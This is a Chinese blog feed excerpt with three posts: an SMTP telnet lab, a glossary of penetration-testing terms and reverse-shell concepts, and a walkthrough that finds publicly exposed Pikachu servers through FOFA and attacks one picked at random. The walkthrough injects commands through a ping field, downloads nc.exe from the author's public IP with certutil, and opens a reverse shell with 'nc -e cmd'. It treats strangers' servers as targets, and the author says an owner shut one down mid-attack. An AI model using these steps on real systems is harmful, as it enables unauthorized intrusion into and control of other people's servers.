        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-启动Windows的telnet服务"><a href="#0x0-启动Windows的telnet服务" class="headerlink" title="0x0.启动Windows的telnet服务"></a>0x0.启动Windows的telnet服务</h2><p>如下图所示，用命令行启动telnet服务，telent需要在windows设置中打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/20240401084015.png" alt=""></p><h2 id="0x1-打开QQ邮箱的SMTP服务"><a href="#0x1-打开QQ邮箱的SMTP服务" class="headerlink" title="0x1.打开QQ邮箱的SMTP服务"></a>0x1.打开QQ邮箱的SMTP服务</h2><p>QQ邮箱的SMTP服务是默认关闭的，故需要我们手动打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401084227704.png" alt="image-20240401084227704"></p><h2 id="0x2-输入telnet-smtp-qq-com-25"><a href="#0x2-输入telnet-smtp-qq-com-25" class="headerlink" title="0x2.输入telnet smtp.qq.com 25"></a>0x2.输入telnet smtp.qq.com 25</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401084454941.png" alt="image-20240401084454941"></p><p>服务器返回220，表示已经与服务器连接成功</p><h2 id="0x3-登录自己的邮箱账户"><a href="#0x3-登录自己的邮箱账户" class="headerlink" title="0x3.登录自己的邮箱账户"></a>0x3.登录自己的邮箱账户</h2><h3 id="输入helo-qq-com-向服务器表明身份"><a href="#输入helo-qq-com-向服务器表明身份" class="headerlink" title="输入helo qq.com,向服务器表明身份"></a>输入helo qq.com,向服务器表明身份</h3><p>返回250 ok，表明SMTP服务器有能力接收邮件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/20240401084919.png" alt=""></p><p>输入auth login，登录账户</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085053018.png" alt="image-20240401085053018"></p><p>返回 334 VXNlcm5hbWU6，拿去Base64解码，发现是Username：</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085403195.png" alt="image-20240401085403195"></p><p>说明这是密文传输，提醒我们要将自己的用户名和密码也用Base64加密后进行传输</p><h3 id="输入邮箱的base64编码"><a href="#输入邮箱的base64编码" class="headerlink" title="输入邮箱的base64编码"></a>输入邮箱的base64编码</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085633318.png" alt="image-20240401085633318"></p><h3 id="输入授权码"><a href="#输入授权码" class="headerlink" title="输入授权码"></a>输入授权码</h3><p>授权码在开启SMTP服务时系统会给你一个授权码，<strong>注意：这里不是输自己QQ邮箱的密码！！！不是自己QQ邮箱的密码！！！</strong>，如果显示连接不上，多试几次，可能很大一部分原因是服务器繁忙</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092432509.png" alt="image-20240401092432509"></p><p>出现如上，表明登录成功，可以开始和服务器进行交互了</p><h2 id="0x4-实验各种命令进行发邮件"><a href="#0x4-实验各种命令进行发邮件" class="headerlink" title="0x4.实验各种命令进行发邮件"></a>0x4.实验各种命令进行发邮件</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092705247.png" alt="image-20240401092705247"></p><p>发现在输入收件人邮箱时一直出现502状态码，后查询资料，发现不能使用常见的25端口，要使用经常加密的587端口，后续将端口换成587，重复上述操作。</p><p>输入以下图片上的命令</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092840797.png" alt="image-20240401092840797"></p><p>得到相关的结果</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092914047.png" alt="image-20240401092914047"></p><p>实验至此结束</p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> SMTP </tag>
            
            <tag> pop3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实战案例-Fofa拿下pikachu服务器（文件上传下载&amp;webshell）</title>
      <link href="/post/b9d95899.html"/>
      <url>/post/b9d95899.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li>本博客仅用于个人复习和学习，无商业用途</li><li>遇到问题，优先在本页搜索，检查是否有相关教程</li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0-实验需要"><a href="#0-实验需要" class="headerlink" title="0.实验需要"></a>0.实验需要</h2><ol><li>一台自己的服务器</li><li>netcat工具（瑞士军刀）</li><li>能动手操作的决心，不怕困难的决心</li></ol><h2 id="1-打开FOFA"><a href="#1-打开FOFA" class="headerlink" title="1.打开FOFA"></a>1.打开FOFA</h2><h3 id="FOFA是什么？"><a href="#FOFA是什么？" class="headerlink" title="FOFA是什么？"></a>FOFA是什么？</h3><p>FOFA是一款网络空间测绘的搜索引擎，旨在帮助用户以搜索的方式查找公网上的互联网资产。简单来说，FOFA的使用方式类似于谷歌或百度，用户可以输入关键词来匹配包含该关键词的数据。不同的是，这些数据不仅包括像谷歌或百度一样的网页，还包括像摄像头、打印机、数据库、操作系统等资产。</p><p>网络空间测绘可以被认为是网络空间的“地图”。就像谷歌地图或高德地图通过卫星图像对地形进行测绘，网络空间测绘也是通过技术探针对全球网络资产进行探测。</p><p>然而，网络空间分为公网和内网。FOFA主要针对公网上的资产进行探测，类似于谷歌地图上的建筑物（IP地址），虽然可以看到建筑物的外部结构和规模，但无法了解内部的情况。这是因为侵犯内网的隐私是违法的。（懂的都懂👀）</p><p>快速通道👉<a href="https://fofa.info/">FOFA</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331163505752.png" alt="FOFA主界面"></p><center>FOFA主界面</center><h2 id="2-查找pikachu服务器"><a href="#2-查找pikachu服务器" class="headerlink" title="2.查找pikachu服务器"></a>2.查找pikachu服务器</h2><p>在搜索框中输入以下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;pikachu&quot;</span>&amp;&amp;country=<span class="string">&quot;CN&quot;</span>&amp;&amp;title==<span class="string">&quot;Get the pikachu&quot;</span></span><br></pre></td></tr></table></figure><p>随机选择一个服务器进入，点击侧边栏RCE下拉框，找到exec”ping”，点击进入</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/%7BD3E49BC8-61EB-4eec-AD69-14614714C341%7D.png" alt="{D3E49BC8-61EB-4eec-AD69-14614714C341}"></p><p>在ping框中输入127.0.0.1并执行，检测服务器是否能够执行命令，当出现以下页面时，说明该服务器不能执行命令，需要重新更换一个服务器</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331165457614.png" alt="image-20240331165457614"></p><p>直至出现以下页面，说明有我们想要的代码执行漏洞存在（可能找的过程会比较漫长，请保持耐心🤡）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331171346526.png" alt="image-20240331171346526"></p><h2 id="3-查看服务器ip地址"><a href="#3-查看服务器ip地址" class="headerlink" title="3.查看服务器ip地址"></a>3.查看服务器ip地址</h2><p>输入127.0.0.1&amp;ipconfig或者127.0.0.1&amp;ifconfig进行查看ip地址，如果服务器是windows操作系统，则为127.0.0.1&amp;ipconfig；如果为linux操作系统，则为127.0.0.1&amp;ifconfig，返回如下界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331171904747.png" alt="image-20240331171904747"></p><p>说明服务器ip地址为10.0.12.10</p><h2 id="4-查看服务器文件夹"><a href="#4-查看服务器文件夹" class="headerlink" title="4.查看服务器文件夹"></a>4.查看服务器文件夹</h2><p>输入127.0.0.1&amp;dir查看服务器文件夹</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331172219218.png" alt="image-20240331172219218"></p><h2 id="5-执行文件下载命令"><a href="#5-执行文件下载命令" class="headerlink" title="5.执行文件下载命令"></a>5.执行文件下载命令</h2><p>将nc.exe放在自己的服务器根目录（wwwroot/My_blog）下，这里我的服务器是使用的宝塔界面（按自己实际需求来）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331173827166.png" alt="image-20240331173827166"></p><p>当访问47.109.189.205（我服务器的公网ip）时，会自动下载nc.exe，如下图测试所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331173648842.png" alt="image-20240331173648842"></p><p>这里出现无法下载是因为我的edge拦截了nc.exe，所以测试仍然成功</p><p>在pikachu服务器上执行自动下载的命令，相关的命令可以去<a href="https://forum.ywhack.com/bountytips.php?download">[~]#棱角 ::Edge.Forum* (ywhack.com)</a>上搜索</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331174137541.png" alt="image-20240331174137541"></p><p>接着去pikachu服务器上执行生成的命令，从我的服务器上下载nc.exe，并命名为1.exe</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&amp;certutil.exe -urlcache -split -f http://<span class="number">47</span>.<span class="number">109</span>.<span class="number">189</span>.<span class="number">205</span>:<span class="number">80</span>/nc.exe <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure><p>额。。。。。。由于做到一半，别人把服务器关了，我又找不到第二个有该漏洞的服务器，所以以下图片源自网络，如有侵权，请联系我删除</p><p>输入127.0.0.1&amp;dir，发现出现1.exe,所以成功让服务器下载到nc.exe</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331181603800.png" alt="image-20240331181603800"></p><h2 id="6-在本地服务器上开启监听"><a href="#6-在本地服务器上开启监听" class="headerlink" title="6.在本地服务器上开启监听"></a>6.在本地服务器上开启监听</h2><p>输入nc -lvvp 5566，开放5566端口进行监听</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331181734111.png" alt="image-20240331181734111"></p><h2 id="7-反弹回显，拿到pikachu服务器控制权"><a href="#7-反弹回显，拿到pikachu服务器控制权" class="headerlink" title="7.反弹回显，拿到pikachu服务器控制权"></a>7.反弹回显，拿到pikachu服务器控制权</h2><p>输入127.0.0.1 &amp; 1.exe -e cmd 47.109.189.205 5566（47.109.189.205为自己服务器的ip），拿到服务器的控制权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331182108462.png" alt="image-20240331182108462"></p><font color ='red'>虽然拿到服务器控制权，但是不要搞破坏，学习为主。</font>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 文件上传下载 </category>
          
          <category> 实战训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门-操作系统安全&amp;&amp;基础名词解释&amp;&amp;反弹Shell</title>
      <link href="/post/235b7e6b.html"/>
      <url>/post/235b7e6b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>渗透入门，第一步先要了解基础名词，以方便我们在阅读各种文章的时候能清楚的知道在干什么，便于我们更好地了解到操作究竟是什么。以下是一些常见的有关操作系统和防火墙的基础名词</p><ul><li>POC：全称“Proof of Concept”，中文“概念验证”，常指一段漏洞的证明代码</li><li>EXP：“Exploit”，中文“利用”指利用漏洞进行攻击的动作</li><li>Payload：“有效载荷”，指成功exploit后，真正在目标系统执行的代码或指令</li><li>Shellcode：漏洞的利用代码，和POC类似</li><li>Webshell：专门针对于Web的后门</li><li>木马：属于恶意程序，主要针对于控制电脑</li><li>病毒：属于恶意程序，主要用来破坏系统</li><li>反弹/回显：当你拿到一个权限，可以将权限移到其他设备，将它反弹过去</li><li>跳板：中介的意思，打个比方，我是A，我想认识C，但是我只认识B，那么我可以通过B去认识C，就是说A通过B以B为跳板去认识到C</li><li>黑白盒测试：黑盒测试除目标外，什么都没有；白盒测试是网上有相关的源码，可以通过源码进行分析，从而进行渗透</li><li>撞库：撞库就是网上泄露出来的一些数据库，那么这些数据库中有真实明显和密码等，那么可以通过对数据库的收集查询，去查询有没有这个人，看看他以前设置过什么密码，看看他这个密码到底是什么含义，然后我们再尝试去其他每天以他账户去和密码登录看有没有能成功的</li><li>ATT&amp;CK：<a href="https://attack.mitre.org/matrices/enterprise/">Matrix - Enterprise | MITRE ATT&amp;CK®</a>（一些网络术语的集合的网站，个人强推）</li></ul><h2 id="操作系统-用途-amp-命令-amp-权限-amp-用户-amp-防火墙"><a href="#操作系统-用途-amp-命令-amp-权限-amp-用户-amp-防火墙" class="headerlink" title="操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙"></a>操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</h2><h3 id="WIndows-amp-Linux常见命令："><a href="#WIndows-amp-Linux常见命令：" class="headerlink" title="WIndows&amp;Linux常见命令："></a>WIndows&amp;Linux常见命令：</h3><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">【3】web安全入门篇-渗透测试中常用的命令_web安全入门篇 渗透测试中常用的命令-CSDN博客</a></p><p>Waf：Web Application FireWall，专门针对于Web的防火墙</p><h2 id="实用案例"><a href="#实用案例" class="headerlink" title="实用案例"></a>实用案例</h2><h3 id="1-文件上传下载-解决无图形化-amp-解决数据传输"><a href="#1-文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="1.文件上传下载-解决无图形化&amp;解决数据传输"></a>1.文件上传下载-解决无图形化&amp;解决数据传输</h3><p>相关命令的生成网站：<a href="https://forum.ywhack.com/bountytips.php?download">[~]#棱角 ::Edge.Forum* (ywhack.com)</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Linux ：wget curl python ruby perl java等</span><br><span class="line">Windows: PowerShell Certutil Bitsadmin msiexec</span><br></pre></td></tr></table></figure><h3 id="2-反弹Shell命令-解决数据回显-amp-解决数据通信"><a href="#2-反弹Shell命令-解决数据回显-amp-解决数据通信" class="headerlink" title="2.反弹Shell命令-解决数据回显&amp;解决数据通信"></a>2.反弹Shell命令-解决数据回显&amp;解决数据通信</h3><p>目的：解决交互式命令无回显的情况，部分交互式活动需要回显才能进行下一步操作</p><h3 id="3-防火墙绕过-正向连接-amp-反向连接-amp-内网服务器"><a href="#3-防火墙绕过-正向连接-amp-反向连接-amp-内网服务器" class="headerlink" title="3.防火墙绕过-正向连接&amp;反向连接&amp;内网服务器"></a>3.防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</h3><p>正向连接：受害主机监听一个端口，由控制主机主动去连接受害主机的过程</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331113811332.png" alt="image-20240331113811332"></p><p>即：<font color="red">攻击机主动连接被攻击机</font></p><p>反向连接：反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331113906001.png" alt="image-20240331113906001"></p><p>即：<font color="red">被攻击者主动连接攻击机</font></p><p>内网服务器：只需要知道内网中的主机可以找到服务器（ping成功），服务器找不到内网中的主机（因为不同的内网中的地址可能是一样的，服务器无法甄别）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331114058029.png" alt="image-20240331114058029"></p><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p>Fofa拿下Pikachu服务器：详情见下一篇博客</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 基础入门 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统安全 </tag>
            
            <tag> 防火墙绕过 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
